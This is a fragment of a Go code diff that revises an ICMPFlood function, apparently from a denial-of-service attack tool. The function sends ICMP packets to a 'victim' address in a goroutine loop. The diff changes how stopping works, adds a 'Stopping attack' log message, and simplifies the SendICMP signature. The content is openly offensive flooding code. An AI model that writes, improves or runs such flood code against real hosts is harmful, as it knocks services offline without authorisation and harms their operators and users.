@@ -39,14 +39,18 @@ func ICMPFlood(victim string, stopChan chan bool) {
 	for {
 		channels <- struct{}{}
 		select {
-		case <-stopChan:
-			<-stopChan
-			return
+		case isStop := <-stopChan:
+			if isStop {
+				LogChan <- "Stopping attack"
+				stopChan <- false
+				return
+			}
+			//continue to default
 
 		default:
 			if !blocked {
 				go func() {
-					err := SendICMP(ipAddr.String(), CreateICMPMessage(), conn)
+					err := SendICMP(CreateICMPMessage(), conn)
 					if err != nil {
 						if strings.Contains(err.Error(), "no buffer space") {
 							//block sending
@@ -74,7 +78,7 @@ func CreateICMPMessage() *icmp.Message {
 	}
 }
 
-func SendICMP(ip string, message *icmp.Message, conn *net.IPConn) error {
+func SendICMP(message *icmp.Message, conn *net.IPConn) error {
 	// Resolve the IP address of the target host
 
 	messageBytes, err := message.Marshal(nil)
